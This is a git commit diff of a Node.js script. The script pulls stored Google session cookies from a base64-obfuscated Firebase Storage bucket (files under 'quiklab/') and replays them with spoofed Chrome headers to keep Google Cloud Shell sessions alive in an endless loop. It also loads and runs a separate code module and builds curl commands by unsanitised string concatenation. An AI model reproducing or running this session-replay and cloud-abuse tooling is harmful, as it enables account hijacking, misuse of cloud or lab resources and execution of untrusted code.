c8666eaa91b70196b1ebb24c1bfa67eb7374fe80
raiyan088 <78313577+raiyan088@users.noreply.github.com>
2024-04-21 13:49:14 +0600

    Add files via upload

--- script.js
+++ script.js
@@ -1,28 +1,31 @@
 const { exec } = require('child_process')
 
+let mCookies = null
+
+let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9qb2Itc2VydmVyLTA4OC5hcHBzcG90LmNvbS9vLw==')
+
 
 process.argv.slice(2).forEach(function (data, index) {
     try {
         if (index == 0) {
-            startServer(data == '2' || data == 2)
+            startServer(data)
         }
     } catch (error) {}
 })
 
 
-async function startServer(double) {
-    if (double) {
-        process = exec('node '+__filename+' 1')
-        process.stdout.on('data', (data) => {
-            let log = data.toString().trimStart().trimEnd()
-            if (log.length > 0) {
-                console.log(log)
-            }
-        })
-        process.stderr.on('data', (data) => {})
-    }
-    
+async function startServer(user) {
+    console.log('---SERVER---')
+
     await startModule()
+
+    while (true) {
+        if (mCookies == null) {
+            mCookies = await getCookies(user)
+        }
+        await aliveServer()
+        await delay(300000)
+    }
 }
 
 async function startModule() {
@@ -32,16 +35,127 @@ async function startModule() {
             let Module = requireModule(code)
             Module.start()
 
-            while (true) {
-                await delay(hours)
-            }
+            console.log('---START---')
         } catch (error) {
-            await delay(300000)
+            await delay(60000)
             await startModule()
         }
     } else {
-        await delay(300000)
+        await delay(60000)
         await startModule()
+    }
+}
+
+
+async function aliveServer() {
+    if (mCookies) {
+        try {
+            let data = await getFetchData('https://shell.cloud.google.com/newtoken?authuser=0', getCloudCookies(mCookies))
+
+            let temp = data.substring(0, data.lastIndexOf('"'))
+            let token = temp.substring(temp.lastIndexOf('"')+1)
+
+            await postAxios('https://shell.cloud.google.com/cloudshell/setupsession?token='+token+'&authuser=0', JSON.stringify([null,[],[2,'']]), getCloudCookies(mCookies))
+        
+        } catch (error) {}
+    }
+}
+
+async function getCookies(user) {
+    try {
+        let data = await getAxios(STORAGE+encodeURIComponent('quiklab/'+user+'.json'))
+        let contentType = JSON.parse(data)['contentType'].replace('base64/', '')
+        return decode(contentType)
+    } catch (error) {}
+
+    return null
+}
+
+async function getAxios(url) {
+    let data = await getCurlData(url)
+    if (data) {
+        return data
+    }
+    return getFetchData(url)
+}
+
+async function getCurlData(url) {
+    return new Promise((resolve) => {
+        try {
+            exec('curl '+url, function (err, stdout, stderr) {
+                try {
+                    if (err) {
+                        resolve(null)
+                    } else {
+                        resolve(stdout.trim())
+                    }
+                } catch (error) {
+                    resolve(null)
+                }
+            })
+        } catch (error) {
+            resolve(null)
+        }
+    })
+}
+
+async function getFetchData(url, data={}) {
+    return new Promise((resolve) => {
+        try {
+            fetch(url, {
+                method: 'GET',
+                headers: data
+            }).then((response) => response.text()).then((data) => {
+                resolve(data)
+            }).catch((error) => {
+                console.log(error)
+                resolve(null)
+            })
+        } catch (error) {
+            resolve(null)
+        }
+    })
+}
+
+async function postAxios(url, body, data) {
+    return new Promise((resolve) => {
+        try {
+            fetch(url, {
+                method: 'POST',
+                headers: data,
+                body: body
+            }).then((response) => {
+                resolve('ok')
+            }).catch((error) => {
+                resolve('ok')
+            })
+        } catch (error) {
+            resolve('ok')
+        }
+    })
+}
+
+
+function getCloudCookies(cookie) {
+    return {
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'en-US,en;q=0.9',
+        'content-type': 'application/json',
+        'cookie': cookie,
+        'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
+        'sec-ch-ua-arch': '"x86"',
+        'sec-ch-ua-bitness': '"64"',
+        'sec-ch-ua-full-version': '"123.0.6312.124"',
+        'sec-ch-ua-full-version-list': '"Google Chrome";v="123.0.6312.124", "Not:A-Brand";v="8.0.0.0", "Chromium";v="123.0.6312.124"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-model': '""',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-ch-ua-platform-version': '"15.0.0"',
+        'sec-ch-ua-wow64': '?0',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
     }
 }
 
@@ -51,20 +165,8 @@ function requireModule(code) {
     return m.exports
 }
 
-async function getAxios(url) {
-    return new Promise((resolve) => {
-        exec('curl '+url, function (err, stdout, stderr) {
-            try {
-                if (err) {
-                    resolve(null)
-                } else {
-                    resolve(stdout.trim())
-                }
-            } catch (error) {
-                resolve(null)
-            }
-        })
-    })
+function decode(data) {
+    return Buffer.from(data, 'base64').toString('ascii')
 }
 
 function delay(time) {
